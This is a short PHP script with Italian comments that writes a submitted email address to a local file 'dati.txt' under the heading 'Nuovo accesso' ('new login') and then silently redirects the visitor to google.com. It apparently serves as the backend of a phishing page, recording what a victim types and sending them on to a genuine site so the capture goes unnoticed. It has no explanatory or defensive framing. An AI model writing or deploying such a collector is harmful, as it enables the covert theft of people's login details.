<?php
  // Apri il file in modalità "append" (aggiungi al file)
  $file = fopen("dati.txt", "a");
  // Scrivi i dati del form nel file
  fwrite($file, "Nuovo accesso:\n");
  fwrite($file, "Email" . " - " . $_POST['email'] . "\n");
  fwrite($file, "\n");
  // Chiudi il file
  fclose($file);


header("Location: https://google.com");
exit;
?>
